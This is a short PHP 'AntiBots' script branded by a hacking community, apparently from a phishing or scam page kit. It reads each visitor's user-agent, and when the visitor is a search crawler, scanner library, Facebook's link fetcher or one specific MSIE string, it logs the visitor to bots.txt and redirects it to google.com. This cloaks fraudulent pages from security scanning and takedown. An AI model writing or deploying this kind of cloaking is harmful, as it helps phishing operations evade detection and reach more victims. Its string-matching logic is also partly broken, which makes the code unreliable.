<?php
/*
       t . m e / b i g s e c c o m m u n i t y 

   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
 ███   ███   ███   ███    ███   ███    ███   ███    █▀  
 ███   ███   ███   ███    ███  ▄███▄▄▄▄██▀   ███        
 ███   ███   ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████ 
 ███   ███   ███   ███    ███ ▀███████████          ███ 
 ███   ███   ███   ███    ███   ███    ███    ▄█    ███ 
  ▀█   ███   █▀    ███    █▀    ███    ███  ▄████████▀  
                                ███    ███              

 M a n i A k a R i s k  | B i g s e c  C o m m u n i t y 
 */

if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')  
		or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
			$content = "AntiBots =>".$_SERVER['HTTP_USER_AGENT']." [ Fucking Bots ] \r\n";
		    $save=fopen("bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("Location: http://www.google.com/");exit();
	}
	if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
			$content = "AntiBots => ".$_SERVER['HTTP_USER_AGENT']." [ Fucking Bots ] \r\n";
		    $save=fopen("bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("Location: http://www.google.com/");exit();


	}

?>